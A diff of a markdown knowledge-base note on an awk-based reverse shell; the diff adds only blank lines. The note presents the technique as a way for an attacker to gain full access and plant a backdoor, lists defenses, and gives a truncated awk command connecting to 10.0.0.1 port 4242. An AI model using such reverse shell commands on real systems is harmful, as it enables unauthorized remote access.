@@ -33,6 +33,8 @@ From a technical perspective, this procedure works by creating a network connect
 
 The business value of this procedure is that it allows an attacker to gain full access to a target machine, which can be used for a variety of malicious purposes.
 
+ 
+
 ## Requirements
 
 1. Network access to the target machine
@@ -40,6 +42,8 @@ The business value of this procedure is that it allows an attacker to gain full 
 1. Ability to execute commands on the target machine
 
 1. Knowledge of the Awk command
+
+ 
 
 ## Defense
 
@@ -49,6 +53,8 @@ The business value of this procedure is that it allows an attacker to gain full 
 
 1. Regularly update and patch software to prevent vulnerabilities that could be exploited for this type of attack
 
+ 
+
 ## Objectives
 
 1. Gain full access to the target machine
@@ -57,11 +63,19 @@ The business value of this procedure is that it allows an attacker to gain full 
 
 1. Create a backdoor for future access
 
+ 
+
 # Instructions
 
 1. This command creates an interactive shell connection to a remote machine using the awk command. The connection is established over TCP/IP and the remote machine's IP address and port number need to be specified in the command. Once the connection is established, a shell prompt is displayed and commands can be executed on the remote machine. The 'exit' command is used to terminate the connection.
 
+ 
+
+
+
 **Code**: [[awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while]]
+
+
 
 > The 'awk' command is used to establish a TCP/IP connection to the remote machine. The IP address and port number of the remote machine need to be specified in the command. Once the connection is established, a shell prompt is displayed and commands can be executed on the remote machine. The 'exit' command is used to terminate the connection. This command can be useful for remote administration and troubleshooting.
 
@@ -81,3 +95,5 @@ The business value of this procedure is that it allows an attacker to gain full 
 - [[Awk]]
 - [[Reverse Shell]]
 - [[Reverse Shell Cheat Sheet]]
+
+
